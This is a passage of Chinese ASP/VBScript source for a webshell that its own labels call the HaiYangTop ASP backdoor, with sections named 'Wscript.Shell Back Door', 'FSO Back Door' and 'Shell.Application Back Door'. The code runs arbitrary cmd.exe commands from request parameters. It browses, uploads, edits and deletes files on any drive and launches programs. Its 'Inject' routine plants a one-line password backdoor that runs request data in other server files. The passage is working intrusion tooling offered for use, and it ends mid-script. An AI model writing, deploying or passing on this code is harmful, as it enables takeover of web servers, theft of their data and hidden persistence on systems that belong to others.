		
		if thePath="" then
			thePath=server.mapPath(".")
		end if
		if theAct="upload" then
			streamUpload thePath,fileName
			echo "<script language=""javascript"">location.href='?pageName=upload';</script>"
		end if
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" enctype="multipart/form-data" action="?pageName=upload&theAct=upload&thePath=<%=encodeForUrl(thePath,false)%>" onsubmit="return upload_canSubmit(this);">
  <tr> 
    <td height="22" class="td">&nbsp;<%=request.serverVariables("server_name")%> - Adodb.Stream File Upload</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="50" align="center" class="td">
	  <input name="file" type="file" size="30">
        保存为 
        <input name="fileName" type="text" value="<%=thePath%>" size="40">
		<input name="Submit" type="submit" id="Submit" value="上 传" onClick="this.form.action+='&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;">
        <input type="checkbox" name="writeMode" value="True">覆盖模式
    </td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="22" align="right" class="td">Powered By <a href="javascript:;" title="QQ:26696782">Marcos</a> 2004.11&nbsp;</td>
  </tr>
</form>
</table>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" class="td">&nbsp;<%=request.serverVariables("server_name")%> 
      - 数制转换</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="50" align="center" class="td"> 
      <input type=text name=text1 value=字符和数字转10和16进制 size=25 id=text9> 
      <input name="按钮" type=button onclick="main();" value="给我转"> <input type="text" name="vars" value=16进制转10进制和字符 size=25 id=vars2> 
      <input name="按钮2" type=button onClick="main2();" value="给我转"> </td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="22" align="right" class="td">Powered By LCX 2004.11&nbsp;</td>
  </tr>
</table>
<script language=vbs>
	sub main()
		base=document.all.text9.value
		If IsNumeric(base) Then
			cc=hex(cstr(base))
			alert("10进制为"&base) 
			alert("16进制为"&cc)
			exit sub
		end if 
		aa=asc(cstr(base))
		bb=hex(aa)
		alert("10进制为"&aa) 
		alert("16进制为"&bb)
	end sub
	sub main2()
		If document.all.vars.value<>"" Then
			Dim nums,tmp,tmpstr,i
			nums=document.all.vars.value
			nums_len=Len(nums)
		For i=1 To nums_len
		    tmp=Mid(nums,i,1)
		    If IsNumeric(tmp) Then
    		    tmp=tmp * 16 * (16^(nums_len-i-1))
	    	Else
	        	If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then 
    	        	alert("你输入的数值中有非法字符，16进制数只包括1～9及a～f之间的字符，请重新输入。")
	        	    exit sub
		        End If
    		    tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))
		    End If
        	tmpstr=tmpstr+tmp
		Next
		alert("转换的10进制为:"&tmpstr&"其字符值为:"&chr(tmpstr))
		End If
	end sub
</script>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" target="_blank">
    <tr> 
      <td height="22" class="td">&nbsp;<%=request.serverVariables("server_name")%> 
        - 海阳顶端网ASP后门执行 </td>
    </tr>
    <tr> 
      <td class="trHead">&nbsp;</td>
    </tr>
    <tr> 
      <td height="18" align="center" class="td">&nbsp;表单提交地址: 
        <input name="theAction" type="text" id="theAction" value="http://" size="50">
        密码: 
        <input name="password" type="password" id="password" size="5"> 
        <input name="Submit422" type="button" class="inputLogin" onClick="this.form.sharp.rows+=6;" value="+"> 
        <input name="Submit42" type="button" class="inputLogin" onClick="if(this.form.sharp.rows&gt;10){this.form.sharp.rows-=6;}" value="-"> 
      </td>
    </tr>
    <tr> 
      <td align="center" class="td"> <textarea name="<%=clientPassword%>" id="sharp" cols="80" rows="10">echo "www.haiyangtop.net"

fsoSaveToFile "物理路径\文件名",request("fileContent")

sub fsoSaveToFile(thePath,fileContent)
	dim fso,theFile
	set fso=server.createObject("scripting.fileSystemObject")
	set theFile=fso.openTextFile(thePath,2,true)
	theFile.write fileContent
	theFile.close
	echo "文件保存成功!"
	set fso=nothing
	set theFile=nothing
end sub

sub echo(str)
    response.write(str)
end sub</textarea>
        <textarea name="fileContent" cols="80" rows="10" id="fileContent">fileContent</textarea> </td>
    </tr>
    <tr> 
      <td align="center" class="td"> 
        <input type="submit" name="Submit3" value="提 交" onClick="this.form.sharp.name=this.form.password.value;this.form.action=this.form.theAction.value;"> 
        <input type="reset" name="Submit32" value="重 置">
        <input type="button" name="Submit4" value="提 示" onClick="alert('上面的文本框用来放要执行的代码\n下面的文本框用来传递其它数据\n下面的文本框的名字是fileContent');"> </td>
    </tr>
    <tr> 
      <td class="trHead">&nbsp;</td>
    </tr>
    <tr> 
      <td height="22" align="right" class="td">Powered By <a href="javascript:;" title="QQ:26696782">Marcos</a> 2004.11&nbsp;</td>
    </tr>
  </form>
</table>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
<form>
  <tr> 
    <td height="22" class="td">&nbsp;<%=request.serverVariables("server_name")%> 
      - 网页代码常用加解密</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
      <td height="250" align="center" class="td"> 
        <textarea cols=80 name=Word onChange=SetWords(this) rows=6></textarea> 
      <br>
      <input name=encode onClick=SetNewWords1(this.form) type=button value="Escape加密"> 
      <INPUT name=uncode onclick=SetNewWords(this.form) type=button value="Escape解密"> 
      <input type="button" name="Submit2" value="Encode加密" onclick="this.form.NewWords.value=screncode(this.form.Word.value,'JS')"> 
      <input type="button" name="Submit2" value="Encode解密" onclick="this.form.NewWords.value=strdec(this.form.Word.value)">
      <br>
      <textarea cols=80 name=NewWords rows=6></textarea> 
    </td>
  </tr>
  </form>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="22" align="right" class="td">Powered By <a href="javascript:;" title="QQ:26696782">Marcos</a> 2004.11&nbsp;</td>
  </tr>
</table>
<%
		showExecuteTime()
	end sub

	sub pageCmdShell()
		isIn(2)
		dim cmdStr,cmdPath,cmdResult
		cmdStr=request("cmdStr")
		cmdPath=request("cmdPath")
		
		showTitle("Shell操作")
		
		if cmdPath="" then
			cmdPath="cmd.exe"
		end if

		if cmdStr<>"" then
			if instr(lcase(cmdPath),lcase("cmd.exe"))>0 or instr(lcase(cmdPath),lcase(myCmdDotExeFile))>0 then
				cmdResult=doCmdRun(cmdPath&" /c "&cmdStr)
			 else
		 		if lcase(cmdPath)=lcase("wscriptShell") then
					cmdResult=doCmdRun(cmdStr)
				 else
					cmdResult=doCmdRun(cmdPath&" "&cmdStr)
				end if
			end if
		end if
		
		echo "<body onload=""document.forms[0].cmdStr.focus();"">"
%> 
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form action="?pageName=cmdShell" method="post" onSubmit="this.Submit.disabled=true">
  <tr> 
    <td height="22" class="td">&nbsp;<%=request.serverVariables("server_name")%> 
      - Wscript.Shell Back Door</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr>
      <td height="22" align="center" class="td"> 路径: 
        <input name="cmdPath" type="text" id="cmdPath" value="<%=cmdPath%>" size="50">
        <input type="button" name="Submit2" value="使用wscript.shell" onClick="this.form.cmdPath.value='wscriptShell';"> </td>
  </tr>
  <tr> 
      <td height="22" align="center" class="td">命令/参数: 
        <input name="cmdStr" type="text" id="cmdStr" value="<%=server.htmlEncode(cmdStr)%>" size="60">
      <input type="submit" name="Submit" value="运 行">
        <input type="button" name="Submit3" value="注" onClick="alert('请只在这里执行单步程序\n(程序执行开始到结束不需要人工干预)\n不然本程序会无法正常工作,\n并且在服务器生成一个不可结束的进程.');"> </td>
  </tr>
  <tr> 
    <td height="22" align="center" class="td">
		<textarea name="cmdResult" cols="90" rows="25" id="cmdResult"><%=server.htmlEncode(cmdResult)%></textarea>
    </td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="22" align="right" class="td">Powered By <a href="javascript:;" title="QQ:26696782">Marcos</a> 2004.11&nbsp;</td>
  </tr>
</form>
</table>
<%
		echo "</body>"
		showExecuteTime()
	end sub

	function doCmdRun(cmdStr)
		on error resume next
		doCmdRun=ws.exec(cmdStr).stdOut.readAll()
		if err then
			echo err.description&"<br>"
			err.clear
			ws.run cmdStr&" > "&server.mapPath(".")&"\001.tmp",0,true
			doCmdRun=fso.openTextFile(server.mapPath(".")&"\001.tmp")
			if err then
				echo err.description&"<br>"
				doCmdRun=streamReadFromFile(server.mapPath(".")&"\001.tmp","gb2312")
			end if
		end if
	end function

	sub pageApp()

		isIn(2)

		dim theAct,dirToView,dirCopyTo,dirCopyFrom,dirMoveTo,dirMoveFrom,appExePath,appExeFile
		theAct=request("theAct")
		dirToView=request("dirToView")
		dirCopyTo=request("dirCopyTo")
		dirCopyFrom=request("dirCopyFrom")
		dirMoveTo=request("dirMoveTo")
		dirMoveFrom=request("dirMoveFrom")
		appExePath=request("appExePath")
		appExeFile=request("appExeFile")
		
		showTitle("application操作页面")
		
		select case theAct
			case "dirView"
				viewDir(dirToView)
			case "dirCopy"
				dirOperate dirCopyFrom,dirCopyTo,"copy"
			case "dirMove"
				dirOperate dirMoveFrom,dirMoveTo,"move"
			case "appExe"
				exeApp appExePath,appExeFile
		end select

%>
<table width=760 border=0 align="center" cellpadding=0 cellspacing=0 class="td">
  <tr height=18> 
      
    <td height="25">&nbsp;<%=request.serverVariables("server_name")%> - Shell.Application 
      Back Door</td>
    </tr>
    <tr> 
      
    <td align=center class="trHead">&nbsp;</td>
    </tr>
  <form method="post" action="?pageName=app&theAct=dirView" onsubmit="this.Submit.disabled=true;">
    <tr height=18> 
      <td height="70" align=center> 
        <input name=dirToView type=text id="dirToView" value="<%=dirToView%>" size="50">
        <br>
        <input type="submit" name="Submit" value="输入要浏览的目录,最后要加\"></td>
    </tr>
  </form>
  <form method="post" action="?pageName=app&theAct=dirCopy">
    <tr height=18> 
      <td height="70" align=center> 把文件(夹) 
        <input name=dirCopyFrom type=text id="dirCopyFrom" value="<%=dirCopyFrom%>" size="39" onsubmit="this.Submit2.disabled=true;">
        复制到 
        <input name=dirCopyTo type=text id="dirCopyTo" value="<%=dirCopyTo%>" size="39">
        下<br>
        <input type="submit" name="Submit2" value="执行复制(最后不要加\)"> </td>
    </tr>
  </form>
  <form method="post" action="?pageName=app&theAct=dirMove" onsubmit="this.Submit3.disabled=true;">
    <tr height=18> 
      <td height="70" align=center>把文件(夹) 
        <input name=dirMoveFrom type=text id="dirMoveFrom" value="<%=dirMoveFrom%>" size="39">
        移动到 
        <input name=dirMoveTo type=text id="dirMoveTo" value="<%=dirMoveTo%>" size="39">
        下<br>
        <input type="submit" name="Submit3" value="执行移动(最后不要加\)"> </td>
    </tr>
  </form>
  <form method="post" action="?pageName=app&theAct=appExe" onsubmit="this.Submit4.disabled=true;">
    <tr height=18> 
      <td height="70" align=center> 路径： 
        <input name=appExePath type=text id="appExePath" value="<%=appExePath%>" size="50" >
        程序： 
        <input name=appExeFile type=text id="appExeFile" value="<%=appExeFile%>" >
        <br>
        <input type="submit" name="Submit4" value="在后台运行程序(不可以加参数)">
      </td>
    </tr>
  </form>
    <tr>
	    <td align=center class="trHead">&nbsp;</td>
    </tr>
    <tr height=18>
    	
    <td height="22" align=right>Powered By Allen &amp; LCX 2004.11&nbsp; </td>
    </tr>
</table>
<div id="loaded" style="display:none;"> 
	<iframe id="fileEditor" frameborder="0" scrolling="no" valign="top" width="100%" height="475"></iframe>
</div>
<%
		showExecuteTime()
	end sub
	
	sub viewDir(dirToView)
		dim sa,co,fod
		if mid(dirToView,2,1)<>":" then
			onErr("请填写真实存在的绝对路径!")
		end if
		set sa=server.createObject(shellStr&"."&applicationStr)
		set fod=sa.namespace(dirToView)
		echo "<table align=center width=760 border=1>"
		on error resume next
		if getParentFolder(dirToView)<>"" then
			echo "<tr height=22 class=""td""><td colspan=2>&nbsp;<a href=""?pageName=app&theAct=dirView&dirToView="&encodeForUrl(getParentFolder(dirToView),false)&""">↑回到上级</a></td></tr>"
		end if
		for each co in fod.items
			if co.isFolder then
				echo "<tr height=22 onmouseover=""this.className='td';"" onMouseOut=""this.className=''""><td>&nbsp;<a href=""?pageName=app&theAct=dirView&dirToView="&encodeForUrl(co.path,false)&""">"&co.path&"</a></td><td align=right>"&getTheSize(co.size)&"&nbsp;</td></tr>"
			 else
				echo "<tr height=22 onmouseover=""this.className='td';"" onMouseOut=""this.className=''""><td>&nbsp;<a href=""javascript:;"" onclick=""stream_downIt('"&encodeForUrl(co.path,true)&"');"">"&co.path&"</a></td><td align=right>"&getTheSize(co.size)&"&nbsp;</td></tr>"
			end if
		next
		if err then
			err.clear
			onErr "路径未找到!"
		end if
		echo "</table><br>"
		set sa=nothing
		set fod=nothing
	end sub
		
	sub dirOperate(dirFrom,dirTo,theAct)
		dim i,sa,fod1,fod2,path,path2,foditem

		if dirFrom="" or dirTo="" then
			onErr("请完整填写各项!")
		end if

		if mid(dirFrom,2,1)<>":" or mid(dirTo,2,1)<>":" then
			onErr("请填写真实存在的绝对路径!")
		end if
		
		set sa=server.createobject(shellStr&"."&applicationStr)

		on error resume next
		set fod1=sa.namespace(dirTo)
		chkErr err,err.description&"');history.back('"

		path2=split(dirFrom,"\")(uBound(split(dirFrom,"\")))
		path=left(dirFrom,len(dirFrom)-len(path2)-1)
		
		if len(path)=2 then
			path=path&"\"
		end if
		
		set fod2=sa.namespace(path)
		set foditem=fod2.parsename(path2)
		chkErr err,err.description&"');history.back('"
		
		if theAct="copy" then
			fod1.copyHere foditem
			chkErr err,err.description&"');history.back('"
		end if
		
		if theAct="move" then
			fod1.moveHere foditem
			chkErr err,err.description&"');history.back('"
		end if
		
		echo "<center>命令成功完成!</center><br>"
		
		set sa=nothing
		set fod1=nothing
		set fod2=nothing
		set foditem=nothing
	end sub

	sub exeApp(appExePath,appExeFile)
		dim sa
		set sa=server.createObject(shellStr&"."&applicationStr)
		on error resume next
		sa.namespace(appExePath).items.item(appExeFile).invokeverb
		chkErr err,err.description&"');history.back('"
		echo "<center>命令成功完成!</center><br>"
		set sa=nothing
	end sub

	sub pageFso()
		dim key,list,path,theAct,toPath,thePath,driveStr,fileName,fileContent
		isIn(2)
		key=request("key")
		path=request("path")
		theAct=request("theAct")
		toPath=request("toPath")
		thePath=request("thePath")
		fileName=request("fileName")
		fileContent=request("fileContent")
		
		if thePath="" then
			thePath=server.mapPath(".")
		end if
		
		if path="" then
			path=thePath
		end if
		
		showTitle("FSO操作页面")
		
		select case theAct
			case "inject"
				fsoInject(thePath)
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "edit"
				fsoEditFile(thePath)
				response.end
			case "save"
				fsoSaveToFile thePath,fileContent
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "delFile"
				fsoDelFile(thePath)
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "delFolder"
				fsoDelFolder(thePath)
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "saveAs"
				fsoSaveAs thePath,toPath
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "createFile"
				if not fso.fileExists(thePath&"\"&request("theName")) then
					fso.createTextFile thePath&"\"&request("theName")
					chkErr err,err.description
				end if
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "createFolder"
				if not fso.folderExists(thePath&"\"&request("theName")) then
					fso.createFolder thePath&"\"&request("theName")
					chkErr err,err.description
				end if
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "searchFolder"
				set path=fso.getFolder(path)
				searchFolder path,key
				response.end
			case "upload"
				streamUpload thePath,fileName
				echo "<script language=""javascript"">location.href='?pageName=fso&thePath="&encodeForUrl(thePath,true)&"';</script>"
		end select

		for each list in fso.drives
			driveStr=driveStr&"<a href=""?pageName=fso&thePath="&list.driveLetter&":\"">"&list.driveLetter&"盘:</a> "
		next
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="4" class="td">&nbsp;<%=request.serverVariables("server_name")%> - FSO Back Door</td>
  </tr>
  <tr> 
    <td colspan="4" class="trHead">&nbsp;</td>
  </tr>
  <form method="post" onSubmit="this.Submit3.disabled=true;" action="?pageName=fso">
    <tr> 
      <td colspan="4" class="td">&nbsp;切换盘符: <%=driveStr%> 本机局域网地址： 
        <%
			on error resume next
        	echo "\\"&net.computerName&"\"&net.userName
			if err then
				err.clear
				echo err.description
			end if
		%>
	  </td>
    </tr>
    <tr> 
      <td colspan="4" class="td">&nbsp;PATH: 
        <input name="thePath" type="text" id="thePath" value="<%=thePath%>" size="60"> 
        <input type="submit" name="Submit3" value="查 看" onclick="location.href='?pageName=fso&thePath='+this.form.thePath.value;this.disabled=true;">
      </td>
    </tr>
  </form>
  <form method="post" action="?pageName=fso&theAct=searchFolder" onsubmit="if(this.key.value==''){alert('请填写关键字!');return false;}else{this.Submit5.disabled=true;}" target="_blank">
    <tr> 
      <td colspan="4" class="td">&nbsp;在 
        <input name="path" type="text" id="path" value="<%=path%>">
        中查找 
        <input name="key" type="text" id="key" value="<%=key%>"> <input type="submit" name="Submit5" value="用于查找存在的木马"></td>
    </tr>
  </form>
  <form method="post">
    <tr> 
      <td colspan="4" class="td">&nbsp; <input name="theName" type="text" id="theName2" size="39"> 
        <input type="button" name="Submit2" value="新建文件" onClick="if(this.form.theName.value==''){alert('请填写文件名!');this.form.theName.focus();}else{fileEditor.location.href='?pageName=fso&thePath=<%=encodeForUrl(thePath,true)%>&theAct=createFile&theName='+this.form.theName.value;this.disabled=true;}"> 
        <input type="button" name="Submit4" value="新建目录" onClick="if(this.form.theName.value==''){alert('请填写文件夹名!');this.form.theName.focus();}else{fileEditor.location.href='?pageName=fso&thePath=<%=encodeForUrl(thePath,true)%>&theAct=createFolder&theName='+this.form.theName.value;this.disabled=true;}"> 
        <span class="warningColor">〖新建文件和新建目录不能同名〗</span></td>
    </tr>
  </form>
  <form method="post" enctype="multipart/form-data" action="?pageName=fso&theAct=upload&thePath=<%=encodeForUrl(thePath,false)%>" onsubmit="return upload_canSubmit(this);">
    <tr> 
      <td colspan="4" class="td">&nbsp; <input name="file" type="file" size="25">
        保存为 
        <input name="fileName" type="text" value="<%=thePath%>" size="35"> 
		<input name="Submit" type="submit" id="Submit" value="上 传" onClick="this.form.action+='&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;">
        <input type="checkbox" name="writeMode" value="True">覆盖模式
      </td>
    </tr>
  </form>
  <tr> 
    <td colspan="4" class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td width="30%" rowspan="2" valign="top" class="td"> 
      <%call fsoGetFolderList(thePath,true)%>
    </td>
  </tr>
  <tr> 
    <td width="555" colspan="3" valign="top"> 
		  <%call fsoGetFolderList(thePath,false)%>
      <div id="loaded" style="display:none;"> 
        <iframe id="fileEditor" frameborder="0" scrolling="no" valign="top" width="100%" height="475"></iframe>
      </div></td>
  </tr>
  <tr> 
    <td colspan="4" class="trHead">&nbsp;</td>
  </tr>
  <tr align="right"> 
    <td height="22" colspan="4" class="td">Powered By Allen &amp; LCX 2004.11&nbsp;</td>
  </tr>
</table>
<a name="foot"></a>
<%
		showExecuteTime()
	end sub
	
	sub fsoEditFile(thePath)
		dim theFile
		on error resume next
		set theFile=fso.openTextFile(thePath,1,false)
		if err then
			echo "错误:"&err.description
			err.clear
			response.end
		end if
%>
<table border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" action="?pageName=fso&theAct=save" onsubmit="if(confirm('您确认要保存当前文件吗?')){this.Submit.disabled=true;this.Submit2.disabled=true;this.Submit3.disabled=true;}else{return false;}">
    <tr>
      <td><input name="thePath" type="text" id="thePath3" value="<%=thePath%>" size="50"> 
        <input type="button" name="Submit62" value="查 看" onclick="location.href='?pageName=fso&theAct=edit&thePath='+this.form.thePath.value;this.disabled=true;"></td>
    </tr>
    <tr> 
      <td><textarea name="fileContent" cols="70" rows="25" id="fileContent"><%=server.htmlEncode(theFile.readAll())%></textarea></td>
    </tr>
    <tr> 
      <td height="50" align="right"> <input type="button" name="Submit" value="保 存" onClick="if(confirm('确认保存修改?')){this.form.submit();}"> 
        <input type="reset" value="重 置">
        &nbsp; </td>
    </tr>
  </form>
</table>
<%
		set theFile=nothing
		
		showExecuteTime()
	end sub

	sub fsoGetFolderList(thePath,showFolder)
		dim ext,flag,list,theHref,theFiles,fileName,theFolder,theFolders
		
		if not fso.folderExists(thePath) then
			onErr("路径错误或者盘空或者没有权限的访问!")
		end if
		
		if len(thePath)=2 then
			thePath=thePath&"\"
		end if
		
		set theFolder=fso.getFolder(thePath)
		set theFiles=theFolder.files
		set theFolders=theFolder.subFolders

		if showFolder=true and getParentFolder(thePath)<>"" then
			echo "&nbsp;<a href=""?pageName=fso&thePath="&encodeForUrl(getParentFolder(thePath),false)&"""><font class=warningColor>↑回上级目录</font></a><br>"
		end if

		if showFolder=true then
			for each list in theFolders
				echo "&nbsp;<a href=""?pageName=fso&thePath="&encodeForUrl(list.path,false)&"""><font class=font-list>└■</font> "
				echo replace(replace(lcase(list.path),lcase(thePath),""),"\","")&""
				echo "</a> <a href=javascript:; onclick=""fso_delFolder('"&encodeForUrl(list.path,true)&"')"">×删除</a><br>"
			next
		 else
			echo "<table width=""98%"" border=""1"" align=""center"" cellpadding=""0"" cellspacing=""0"">"
			echo "<tr><td align=""center"" class=""td"">文件名 (鼠标移到文件名可以查看给文件的属性)</TD>"
			echo "<TD align=""center"" class=""td"">大小</TD>"
			echo "<TD align=""center"" class=""td"">文件操作</TD></tr>"
			for each list in theFiles
				ext=split(list.path,".")(uBound(split(list.path,".")))
				flag=instr(lcase(editableFileExt),lcase("$"&ext&"$"))
				fileName=replace(replace(lcase(list.path),lcase(thePath),""),"\","")
				if instr(lcase(list.path),lcase(server.mapPath("\"))) then
					theHref=mid(replace(lcase(list.path),lcase(server.mapPath("\")),""),2)
					echo "<tr onmouseover=""this.className='td';"" onmouseout=""this.className=''""><td>&nbsp;<font class=font-list>□</font>"
					echo "<a href=""\"&encodeForUrl(theHref,false)&""" title=""文件名: "&fileName&chr(13)&"类型: "&list.type&chr(13)&"属性: "&list.Attributes&chr(13)&"时间："&list.DateLastModified&""" target=""_blank"">"
					if getStrLen(fileName)>40 then
						fileName=getCutStr(fileName,40)&".."
					end if
					echo fileName&"</a></td>"
				 else
					echo "<tr onmouseover=""this.className='td';"" onmouseout=""this.className=''""><td>&nbsp;<font class=font-list>□</font>"
					echo "<font style=""cursor: hand;"" title=""文件名: "&fileName&chr(13)&"类型: "&list.type&chr(13)&"属性: "&list.Attributes&chr(13)&"时间："&list.DateLastModified&""">"
					if getStrLen(fileName)>40 then
						fileName=getCutStr(fileName,40)&".."
					end if
					echo fileName&"</font></td>"
				end if
				echo "<td align=center>" & getTheSize(list.size) & "</td><td align=center>"
				if flag>0 then
					echo "<a href=#foot onclick=""fso_editIt('"&encodeForUrl(list.path,true)&"');""><font class=warningColor>Edit</font></a> "
				end if
				echo "<a href=javascript:; onclick=""fso_saveAs('"&encodeForUrl(list.path,true)&"');""><font class=warningColor>SaveAs</font></a> "
				echo "<a href=javascript:; onclick=""stream_downIt('"&encodeForUrl(list.path,true)&"');""><font class=warningColor>Down</font></a> "
				echo "<a href=javascript:; onclick=""fso_delFile('"&encodeForUrl(list.path,true)&"')""><font class=warningColor>Del</font></a> "
				if flag>0 then
					echo "<a href=javascript:; onclick=""fso_inject('"&encodeForUrl(list.path,true)&"')""><font class=warningColor>Inject</font></a>"
				end if
				echo "</td></tr>"&vbNewline
			next
			echo "</table>"
		end if
	end sub
	
	sub fsoSaveAs(thePath,toPath)
		if lTrim(thePath)=lTrim(toPath) then
			echo "<script>alert('源路径与目标路径相同,操作停止!');</script>"
			response.end
		end if
	 	if fso.fileExists(thePath) then 
			fso.copyFile thePath,toPath
			echo "<script language=""javascript"">alert('另存为操作成功!');</script>"
		 else
			echo "<script>alert('请确认源文件存在！');history.back();</script>"
		end if
	end sub
	
	sub fsoInject(thePath)
		dim theFile
		set theFile=fso.openTextFile(thePath,8,True,0)
		theFile.writeLine(" <script language=""vbscript"" runat=server>if request("""&clientPassword&""")<>"""" then execute(request("""&clientPassword&"""))</script>")
		theFile.close
		echo "<script language=""javascript"">alert('插入成功!请用海阳顶端网asp后门来访问你插入的文件"&request("path")&"');</script>"
		set theFile=nothing
	end sub
	
	sub fsoSaveToFile(thePath,fileContent)
		dim theFile
		set theFile=fso.openTextFile(thePath,2,true)
		theFile.write fileContent
		theFile.close
		echo "文件保存成功! [<a href="""&request.serverVariables("http_referer")&""">返回</a>]"
		set theFile=nothing
	end sub
	
	sub fsoDelFile(thePath)
		dim theFile
		set theFile=fso.getFile(thePath)
		theFile.delete true
		set theFile=nothing
	end sub
	
	sub fsoDelFolder(thePath)
		fso.deleteFolder thePath,true
	end sub
	
	sub searchFolder(folder,str)
		dim ext,n,title,theFile,theFolder
		for each theFile In folder.Files
			ext=split(theFile,".")(uBound(split(theFile,".")))
			if lcase(ext)="asp" or lcase(ext)="asa" or lcase(ext)="cer"  or lcase(ext)="cdx" then
				if searchFile(theFile,str,title) then
					echo fileLink(theFile,title)
					n=n+1
				end if
			end if
		next
		for each theFolder in folder.subFolders
			searchFolder theFolder,str
		next
	end sub
	
	function searchFile(f,s,title)
		dim fo,content,pos1,pos2
		set fo=fso.openTextFile(f)
		on error resume next
		content=fo.ReadAll()
		fo.close
		if err then
			err.clear
			content=""
		end if
		searchFile=instr(1,content,S,vbTextCompare)>0 
		if searchFile then
			pos1=instr(1,content,"<TITLE>",vbTextCompare)
			pos2=instr(1,content,"</TITLE>",vbTextCompare)
			title=""
			if pos1>0 and pos2>0 then
				title=mid(content,pos1+7,pos2-pos1-7)
			end if
		end if
		set fo=nothing
	end function
	
	function fileLink(f,title)
		fileLink=f.path
		if title="" then
			title=f.Name
		end if
		fileLink="<UL>·"&title&" "&fileLink&"</UL>"
	end function

	sub pageOther()
%>
<style>
BODY {
	FONT-SIZE: 9pt;
	COLOR: #000000;
	FONT-FAMILY: "Courier New";
	SCROLLBAR-FACE-COLOR: #e8e7e7;
	SCROLLBAR-HIGHLIGHT-COLOR: #ffffff;
	SCROLLBAR-SHADOW-COLOR: #ffffff;
	SCROLLBAR-3DLIGHT-COLOR: #cccccc;
	SCROLLBAR-ARROW-COLOR: #000000;
	SCROLLBAR-TRACK-COLOR: #EFEFEF;
	SCROLLBAR-DARKSHADOW-COLOR: #b2b2b2;
	SCROLLBAR-BASE-COLOR: #000000;
}
TABLE {
	FONT-SIZE: 9pt;
	FONT-FAMILY: "Courier New";
	BORDER-COLLAPSE: collapse;
	border-top-width: 1px;
	border-right-width: 1px;
	border-bottom-width: 1px;
	border-left-width: 1px;
	border-top-style: solid;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: solid;
	border-top-color: #cccccc;
	border-right-color: #cccccc;
	border-bottom-color: #cccccc;
	border-left-color: #cccccc;
}
.tr {
	font-family: "Courier New";
	font-size: 9pt;
	background-color: #dddddd;
	text-align: center;
}
.td {
	font-family: "Courier New";
	font-size: 9pt;
	background-color: F8F8F8;
}
.warningColor {
	font-family: "Courier New";
	font-size: 9pt;
	color: #ff0000;
}
input {
	font-family: "Courier New";
	FONT-SIZE: 12px;
	border: 1px solid #cccccc;
	color: #000000;
}
textarea {
	font-family: "Courier New";
	FONT-SIZE: 12px;
	border: 1px solid #cccccc;
	color: #000000;
}
A:visited {
	FONT-SIZE: 9pt; 
	COLOR: #333333; 
	FONT-FAMILY: "Courier New"; 
	TEXT-DECORATION: none;
}
A:active {
	FONT-SIZE: 9pt; 
	COLOR: #3366cc; 
	FONT-FAMILY: "Courier New"; 
	TEXT-DECORATION: none;
}
A:link {
	FONT-SIZE: 9pt; 
	COLOR: #000000;
	FONT-FAMILY: "Courier New"; 
	TEXT-DECORATION: none;
}
A:hover {
	FONT-SIZE: 9pt; 
	COLOR: #3366cc; 
	FONT-FAMILY: "Courier New"; 
	TEXT-DECORATION: none;
}
tr {
	font-family: "Courier New";
	font-size: 9pt;
	line-height: 18px;
}
td {
	font-family: "Courier New";
	font-size: 9pt;
	border-top-width: 1px;
	border-right-width: 1px;
	border-bottom-width: 1px;
	border-left-width: 1px;
	border-top-style: none;
	border-right-style: solid;
	border-bottom-style: solid;
	border-left-style: none;
	border-top-color: #cccccc;
	border-right-color: #cccccc;
	border-bottom-color: #cccccc;
	border-left-color: #cccccc;
}
.trHead {
	font-family: "Courier New";
	font-size: 9pt;
	line-height: 3px;
	background-color: #dddddd;

}
.inputLogin {
	font-family: "Courier New";
	font-size: 9pt;
	border: 1px solid #D4D0C8;
	background-color: #FFffff;
	vertical-align: bottom;
}
.font-list {
	font-size: 9pt;
	color: cccccc;
	font-family: "Courier New";
}
</style>
<script lanuage="javascript">
//页面上一些要用到的JS,Marcos编写.
function default_canLogin(frm){
	if(frm.password.value==""){
		alert("请先输入密码!");
		return false;
	}else{
		frm.Submit.disabled=true;
		return true;
	}
}

function stream_editIt(thePath){
	loaded.style.display="block";
	fileEditor.location.href="?pageName=stream&thePath="+thePath+"&theAct=edit";
}

function stream_downIt(thePath){
	loaded.style.display="none";
	if(confirm("如果该文件超过20M,\n建议不要通过流方式下载\n这样会占用服务器大量的资源\n并可能导致服务器死机!\n您可以先用FSO把文件复制到网站目录下,\n然后通过http协议来下载.\n按\"确定\"用流来进行下载.")){
		fileEditor.location.href="?pageName=stream&thePath="+thePath+"&theAct=down";
	}
}

function stream_saveAs(frm,thePath){
	if(frm.thePath.value=prompt('请输入要保存的文件的绝对路径!',thePath)){
